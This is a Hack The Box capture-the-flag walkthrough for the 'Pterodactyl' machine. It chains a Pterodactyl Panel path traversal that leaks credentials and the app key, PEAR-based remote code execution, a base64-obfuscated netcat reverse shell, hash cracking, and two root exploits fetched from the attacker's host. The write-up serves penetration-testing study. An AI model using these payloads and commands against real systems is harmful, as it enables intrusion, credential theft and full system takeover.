
<div align="center">
  <img src="attachments/Pasted%20image%2020260424063607.png">
</div>

By: https://app.hackthebox.com/users/2727685

![](attachments/Pasted%20image%2020260424063607.png)

---

# Recon/1 - Port scan, Website, Changelogs

```shell
Nmap scan report for 10.129.37.175
Host is up (0.10s latency).
Not shown: 86 filtered tcp ports (no-response), 10 filtered tcp ports (admin-prohibited)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
| ssh-hostkey: 
|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)
|_  256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)
80/tcp   open   http       nginx 1.21.5
|_http-title: Did not follow redirect to http://pterodactyl.htb/
|_http-server-header: nginx/1.21.5
443/tcp  closed https
8080/tcp closed http-proxy

```

The machine is being used to host a website under *default http port:80* 
Also **ports 443 and 8080 closed, not filtered**. The ports are reachable but no service is bound to them. Not useful for the moment but good to note.

### Website 

<img src="attachments/Pasted%20image%2020260424200344.png" width="400">

Only things we can interact with are:
* Minecraft Server IP - copy 
* Changelogs - view 

### Change logs: 

```
MonitorLand - CHANGELOG.txt
======================================

Version 1.20.X

[Added] Main Website Deployment
--------------------------------
- Deployed the primary landing site for MonitorLand.
- Implemented homepage, and link for Minecraft server.
- Integrated site styling and dark-mode as primary.

[Linked] Subdomain Configuration
--------------------------------
- Added DNS and reverse proxy routing for play.pterodactyl.htb.
- Configured NGINX virtual host for subdomain forwarding.

[Installed] Pterodactyl Panel v1.11.10
--------------------------------------
- Installed Pterodactyl Panel.
- Configured environment:
  - PHP with required extensions.
  - MariaDB 11.8.3 backend.

[Enhanced] PHP Capabilities
-------------------------------------
- Enabled PHP-FPM for smoother website handling on all domains.
- Enabled PHP-PEAR for PHP package management.
- Added temporary PHP debugging via phpinfo()
```

### Useful Information

**Pterodactyl Panel** v1.11.10
**MariaDB** 11.8.3 backend.
 
**PHP Capabilities**
Enabled PHP-FPM for smoother website handling on all domains. Enabled PHP-PEAR for PHP package management.Added temporary PHP debugging via *phpinfo()*

This means there's a `phpinfo()` page exposed somewhere. I tried `http://pterodactyl.htb/phpinfo.php` and got:

<img src="attachments/Pasted%20image%2020260424140758.png" width="627">

Key findings were: 
- **DOCUMENT_ROOT:** `/var/www/html`
- **SCRIPT_FILENAME:** `/var/www/html/phpinfo.php`
- **include_path:** `/usr/share/php/PEAR` ← PEAR is accessible!
>[!NOTE]
> **What is PEAR?** 
>PEAR (PHP Extension and Application Repository) is like a package manager for PHP — similar to `pt` for Linux or `pip` for Python. It comes with a script called `pearcmd.php` that manages packages.
- **disable_functions:** none! ← can execute system commands
- **USER:** `wwwrun`

### Non-Exploitable Finding/1 - For Future Reference
---

**What is `register_argc_argv`?** Normally when you run a script from the command line you can pass arguments like:

```
php script.php arg1 arg2
```

>[!NOTE] 
>**register_argc_argv**
register_argc_argv is a PHP setting that when turned **On**, makes PHP also accept arguments passed via the **URL query string** and treat them as if they were command line arguments.

We saw in **phpinfo** that it was **On** — meaning we can pass "command line arguments" to *PHP scripts* through the URL.


---
# Recon/2 - finding login panel

Now that we learned that the website is powered by **pterodactyl**, and the version its currently running on we mustn't forget to search for **exploits** based on this service.

 ```shell
 └─$ searchsploit pterodactyl
Pterodactyl Panel 1.11.11 - Remote Code Execution (RCE)                          
 ```
 
**Version 1.11.11** (and prior to it) of Pterodactyl Panel is vulnerable to *RCE*.

Trying to use the payload from *searchsploit* proves **unsuccessful**:

```shell
└─$ python3 /usr/share/exploitdb/exploits/multiple/webapps/52341.py http://pterodactyl.htb/
Not vulnerable
```

Through Vhost enumeration:

```shell
└─$ gobuster vhost -u http://pterodactyl.htb -w /usr/share/wordlists/dirb/common.txt --append-domain
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://pterodactyl.htb
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/wordlists/dirb/common.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
---(SNIP)---
panel.pterodactyl.htb Status: 200 [Size: 1897]
Program Files.pterodactyl.htb Status: 400 [Size: 157]
reports list.pterodactyl.htb Status: 400 [Size: 157]
Progress: 4613 / 4613 (100.00%)

```

*panel.pterodactyl.htb Status: 200 (Size: 1897)*
We've discovered another subdomain.

Most likely an admin control panel. We can access it after adding it to */etc/hosts* under the same machine IP as **pterodactyl.htb**

<img src="attachments/Pasted%20image%2020260424133856.png" width="634">

Successfully prompted for a login.

# Exploitation/1 Path Traversal - [CVE-2025-49132/LFI](https://github.com/Zen-kun04/CVE-2025-49132)

Try the exploit again on this domain.

```shell
└─$ python3 /usr/share/exploitdb/exploits/multiple/webapps/52341.py http://panel.pterodactyl.htb
http://panel.pterodactyl.htb/ => pterodactyl:PteraPanel@127.0.0.1:3306/panel
```

It worked. We have recovered database **credentials**:
**User:** `petrodactyl`
**Password:** `PteraPanel`
**Database:** `panel`
**Host:** `127.0.0.1:3306`

>[!TIP]
>Never give up after not being able to execute a vulnerability. Just because it didn't work on the main interface doesn't mean the subdomains aren't affected.

These are *MySQL credentials*. To use them you need to be **inside the machine** since MySQL is listening on `127.0.0.1`(localhost only).
>We need to find a way to run commands from inside the machine in order to access the database.

### Non-Exploitable Finding/2 - Laravel Key

Looking at the **CVE** we exploited earlier:

```python
# Exploit Title: Pterodactyl Panel 1.11.11 - Remote Code Execution (RCE)
# Date: 22/06/2025
# Exploit Author: Zen-kun04
# Vendor Homepage: https://pterodactyl.io/
# Software Link: https://github.com/pterodactyl/panel
# Version: < 1.11.11
# Tested on: Ubuntu 22.04.5 LTS
# CVE: CVE-2025-49132

import requests 
import json 
import argparse 
import colorama 
import urllib3 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) arg_parser = argparse.ArgumentParser( description="Check if the target is vulnerable to CVE-2025-49132.") arg_parser.add_argument("target", help="The target URL") args = arg_parser.parse_args() try: target = args.target.strip() + '/' if not args.target.strip().endswith('/') else args.target.strip() r = requests.get(f"{target}locales/locale.json?locale=../../../pterodactyl&namespace=config/database", allow_redirects=True, timeout=5, verify=False) if r.status_code == 200 and "pterodactyl" in r.text.lower(): try: raw_data = r.json() data = { "success": True, "host": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("host", "N/A"), "port": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("port", "N/A"), "database": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("database", "N/A"), "username": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("username", "N/A"), "password": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("password", "N/A") } print(f"{colorama.Fore.LIGHTGREEN_EX}{target} => {data['username']}:{data['password']}@{data['host']}:{data['port']}/{data['database']}{colorama.Fore.RESET}") except json.JSONDecodeError: print(colorama.Fore.RED + "Not vulnerable" + colorama.Fore.RESET) except TypeError: print(colorama.Fore.YELLOW + "Vulnerable but no database" + colorama.Fore.RESET) else: print(colorama.Fore.RED + "Not vulnerable" + colorama.Fore.RESET) except requests.RequestException as e: if "NameResolutionError" in str(e): print(colorama.Fore.RED + "Invalid target or unable to resolve domain" + colorama.Fore.RESET) else: print(f"{colorama.Fore.RED}Request error: {e}{colorama.Fore.RESET}")
```

This CVE is actually a **path traversal** vulnerability, it reads the database config file by traversing directories via the `locale` parameter.

The URL it's hitting is:

```shell
/locales/locale.json?locale=../../../pterodactyl&namespace=config/database
```

This means it can read arbitrary config files by changing the path. We could try reading other sensitive files.

```shell
curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/app"
```

```json
{"..\/..\/..\/pterodactyl":{"config\/app":{"version":"1.11.10","name":"Pterodactyl","env":"production","debug":"","url":"http:\/\/panel.pterodactyl.htb","timezone":"UTC","locale":"en","fallback_locale":"en","key":"base64{{UaThTPQnUjrrK61o}}+Luk7P9o4hM+gl4UiMJqcbTSThY=",
----------{SNIP}----------
```

We got the APP_KEY (else known as Laravel Key: 
`base64{{UaThTPQnUjrrK61o}}+Luk7P9o4hM+gl4UiMJqcbTSThY=`

---

>[!NOTE] 
>**Laravel APP_KEY**
>The Laravel application key is a secret key used to:
>1. **Encrypt/decrypt** cookies and session data
>2. **Sign** data to prevent tampering
>3. **Generate** secure tokens

Think of it like a master password that Laravel uses behind the scenes for all cryptographic operations.

**Why it's dangerous when leaked:**

- Laravel encrypts cookies using this key
- If you know the key, you can **forge your own encrypted cookies**
- Laravel trusts encrypted cookies and **deserializes** their contents
- If you craft a malicious serialized PHP object and encrypt it with the app key, Laravel will deserialize it — giving you **RCE**

This is the classic **Laravel cookie deserialization RCE** attack.

The key you found was:

```
base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
```

Note: the `{{` and `}}` around part of it in the raw output were just formatting artifacts — the actual key is `base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=`

---

# Exploitation/2 RCE - [CVE-2025-49132/RCE](https://github.com/advisories/GHSA-24wv-6c99-f843)

### Returning back to PEAR

>[!NOTE]
>**Maximum impact**
>While **CVE-2025-49132** is fundamentally a Path Traversal bug in the `locales` feature, its capability isn't limited to just reading files. In **Phase 1**, we use the traversal to disclose sensitive configuration files (the database credentials and the Laravel App Key). In **Phase 2**, we leverage that exact same vulnerable endpoint alongside the leaked cryptographic data to trigger an unauthenticated Remote Code Execution (RCE) via PHP object handling.

#####  More in depth about the vulnerability

The `/locales/locale.json` endpoint accepts `locale` and `namespace` parameters that are passed directly to PHP's `include()` without sanitization or authentication. The `hash` parameter intended to prevent abuse is never enforced on unpatched versions.

This allows:

- **Local File Inclusion (LFI)** - Read any `.php` config file (database creds, APP_KEY, mail, session…)
- **Remote Code Execution (RCE)** - Via `pearcmd.php` inclusion (register_argc_argv + config-create trick), PHP filter chains, or Laravel deserialization with the leaked APP_KEY

**Affected:** Pterodactyl Panel ≤ 1.11.10 **Fixed in:** 1.11.11

### Using the improved POC

```shell
└─$ python3 poc.py -H panel.pterodactyl.htb -c "id" -v 
[CVE-2025-49132] 
Pterodactyl Panel RCE via PHP PEAR [_] Target: [http://panel.pterodactyl.htb/locales/locale.json](http://panel.pterodactyl.htb/locales/locale.json "http://panel.pterodactyl.htb/locales/locale.json
(http://panel.pterodactyl.htb/locales/locale.json)") [_] Creating payload on target... [_] PEAR Path: /usr/share/php/PEAR [_] Payload: <?=system('id')?> [+] Payload file created successfully [*] Executing command: id [!] Execute request returned status 500 (checking body for output) [+] Command Output: uid=474(wwwrun) gid=477(www) groups=477(www)
```

We achieve Remote Command Execution. The first thing we should do after achieving an RCE is pop a reverse shell. 

### Reverse shell

>[!TIP] 
>**Rev Shells**
One of the most reliable, classic ways to get a remote terminal when standard methods (like a simple `nc -e /bin/bash` or `busybox`) are stripped out, blocked, or broken on the target system is a **Named Pipe Reverse Shell**.


```shell
└─$ echo "(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc YOUR_IP LISTENR_PORT >/tmp/f)" | base64 -w0
KHJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8YmFzaCAtaSAyPiYxfG5jIDEwLjEwLjE3Ljk3IDQ0NDQgPi90bXAvZikK 
```
>The conversion of the reverse shell commands into **base64** is used to bypass any *blocked words* by the **firewall**. Once the base64 encrypted command chain is transported into the *server*, it will **decrypt and run** as normal
##### Set up a listner:

```shell
└─$ nc -lvnp 4444
```

##### Getting a reverse shell:

```shell
└─$ python3 poc.py -H panel.pterodactyl.htb -c "KHJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8YmFzaCAtaSAyPiYxfG5jIDEwLjEwLjE3Ljk3IDQ0NDQgPi90bXAvZikK |base64 -d |bash" -v

```

Instead of the command `id`, it now returns `echo BASE64_PAYLOAD_HERE|base64 -d |bash`, which executes our reverse shell without being flagged.
##### Verification:

```shell
wwwrun@pterodactyl:/var/www/pterodactyl/public> whoami
whoami
wwwrun
```

##### Upgrade shell:

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

Since we finally have command execution locally we can connect to the MySQL listening on localhost we discovered earlier.

## MySQL DB - User credentials

```shell
wwwrun@pterodactyl:/home> mysql -u pterodactyl -pPteraPanel -h 127.0.0.1 panel
```

```d
MariaDB [panel]> SHOW TABLES;
+-----------------------+
| Tables_in_panel       |
+-----------------------+
| activity_log_subjects |
| activity_logs         |
| allocations           |
| api_keys              |
| api_logs              |
| ---(SNIP)---          |
| tasks                 |
| tasks_log             |
| user_ssh_keys         |
| users                 |
+-----------------------+
```

```sql
SELECT * FROM users;
```

**Found hash:** `$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi` for user **phileasfogg3**

##### Crack the hash

```shell
echo '$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi' > hash.txt
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Password:** `!QAZ2wsx`

### SSH session

Now we have recovered the full credentials to ssh as a normal user

```shell
ssh phileasfogg3@MACHINE_IP_HERE
```

#### User flag

```shell
phileasfogg3@pterodactyl:~> cat ~/user.txt
65eac284ce6540231937f6b98ac73e43
```

## Privilege Escalation to Root

In this walk-through I am going to be documenting **two paths** I used to **escalate privileges** and obtain system flag: 
- The first one being the intended route which exploits a **CVE chain attack**
- Second one is going to be through **Copy Fail**

> [!TIP]
> **Copy Fail**
> CVE-2026-31431 is a Linux kernel vulnerability in the `authencesn` AEAD cryptographic implementation that allows unprivileged processes to corrupt the page cache of readable files via AF_ALG sockets and splice() syscall manipulation. In other words, allows an ordinary user to instantly become root. Affected: Linux kernel versions with authencesn support (2017-2026)


### Intended route - CVE-2025-6018 + CVE-2025-6019

Lets check what kind of privileges our acquired user has:

```shell
phileasfogg3@pterodactyl:~> sudo -l                                                                                  
Matching Defaults entries for phileasfogg3 on pterodactyl:                                                           
---(SNIP)---

User phileasfogg3 may run the following commands on pterodactyl:
    (ALL) ALL

```

Since the user we currently have a session on doesn't have any **sudo command** restrictions, we should try a direct Privilege Escalation.

```shell
phileasfogg3@pterodactyl:~> sudo su
[sudo] password for root: 
Sorry, try again.

```
>Normally, we would be prompted to enter our own password, but that doesn't seem to be the case with this machine. The failure of the `sudo su` command indicates that the `/etc/sudoers` configuration file on the target system is tightly hardened. Instead of allowing the current user to run administrative commands using their own password or via a passwordless rule (`NOPASSWD`), the system has been explicitly configured to demand the actual **root account password**. Without obtaining this specific credential, direct escalation via this method is completely blocked.

Next we should enter the enumeration phase, let's check what's actually on the system. In these kinds of challenges useful information is most often found in the **var** directory.

#### Internal Reconnaissance 

```shell
phileasfogg3@pterodactyl:/var> ls
adm  agentx  cache  crash  lib  lock  log  mail  opt  run  spool  tmp  www
```

```shell
phileasfogg3@pterodactyl:/var/mail> cat phileasfogg3 
From headmonitor@pterodactyl Fri Nov 07 09:15:00 2025
Delivered-To: phileasfogg3@pterodactyl
Received: by pterodactyl (Postfix, from userid 0)
id 1234567890; Fri, 7 Nov 2025 09:15:00 +0100 (CET)
From: headmonitor headmonitor@pterodactyl
To: All Users all@pterodactyl
Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)
Message-ID: 202511070915.headmonitor@pterodactyl
Date: Fri, 07 Nov 2025 09:15:00 +0100
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

Attention all users,

Unusual activity has been observed from the udisks daemon (udisksd). No confirmed compromise at this time, but increased vigilance is required.

Do not connect untrusted external media. Review your sessions for suspicious activity. Administrators should review udisks and system logs and apply pending updates.

Report any signs of compromise immediately to headmonitor@pterodactyl.htb

— HeadMonitor
System Administrator
```

The most critical takeaway is the explicit mention of the **udisks daemon.

>[!NOTE]
> **Udisks daemon**
>What it is: `udisksd` is a background system service in Linux used
>to query and manipulate storage devices (like mounting USB 
>drives, hard disks, etc.). Because it interacts directly with 
>hardware and storage, it typically runs with high privileges 
>(`root`).

It warns users _not to connect external media_. Since we are connected via a remote shell and cannot physically plug in a USB drive, the attack chain requires us to exploit this digitally
##### CVE-2025-6018 — Become allow_active

Linux systems utilize **Polkit** (PolicyKit) to decide whether a user can perform system actions (like mounting drives). Polkit heavily relies on a session classification called **`allow_active`**.
>An `allow_active` status is typically restricted to a user _physically sitting at the console/GUI_. Remote users (like an attacker on an SSH shell) do not have this status and are blocked from dangerous actions.
>The Flaw is a vulnerability found in the Pluggable Authentication Modules (**PAM**) configuration. A local unprivileged attacker can exploit this flaw to forge their session state, essentially tricking Polkit into believing they are a physically present, active console user.

Set PAM environment variables:

```shell
echo 'XDG_SEAT OVERRIDE=seat0' > ~/.pam_environment echo 'XDG_VTNR OVERRIDE=1' >> ~/.pam_environment exit ssh phileasfogg3@10.129.37.175
```

Verify:

```shell
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
# Should return ('yes',)
```

##### CVE-2025-6019 — LPE via udisks

Next, we proceed with **CVE-2025-6019** by creating a malicious local XFS filesystem image pre-loaded with an SUID root binary. We then use `udisksctl` to force the `udisksd` daemon to interact with and resize the image. Because `libblockdev` handles the filesystem modification incorrectly, it mounts the image while failing to enforce the mandatory `nosuid` flag. Running the exposed SUID binary yields an immediate, unauthenticated shell as **root**.

**On Kali (as root):**

```shell
git clone https://github.com/guinea-offensive-security/CVE-2025-6019
cd CVE-2025-6019
sudo bash exploit.sh
# Select L for Local to create xfs.image
python3 -m http.server 80
```

On target:

```shell
export PATH=$PATH:/sbin:/usr/sbin
curl http://10.10.17.97/xfs.image -o ~/xfs.image
curl http://10.10.17.97/exploit.sh -o ~/exploit.sh
chmod +x ~/exploit.sh
bash ~/exploit.sh
# Select C for Cible
```

```shell
/tmp/blockdev.*/bash -p
```


## Alternative - [CVE-2026-31431 Copy Fail](https://github.com/SeanRickerd/cve-2026-31431/blob/main/exploit.py)

```shell
curl http://10.10.17.97/exploit.py -o /tmp/copyfail.py
python3 /tmp/copyfail.py
su
```

```shell
phileasfogg3@pterodactyl:~> python3 /tmp/copyfail.py
[*] CVE-2026-31431 Copy Fail Exploit
[*] Target: /usr/bin/su

[+] Opened /usr/bin/su (fd=3)
[+] Shellcode size: 160 bytes
[+] Patching /usr/bin/su in page cache...
    Written 16/160 bytes...
    Written 32/160 bytes...
    Written 48/160 bytes...
    Written 64/160 bytes...
    Written 80/160 bytes...
    Written 96/160 bytes...
    Written 112/160 bytes...
    Written 128/160 bytes...
    Written 144/160 bytes...
    Written 160/160 bytes...
[+] Page cache patching complete!
[+] Executing modified su...

pterodactyl:/home/phileasfogg3 # whoami
root
```

## Root flag

```shell
pterodactyl:/root # cat root.txt
8e77e1797e93db36bf7ba8c170e826bf
```


<img src="attachments/Pasted%20image%2020260515072945.png">
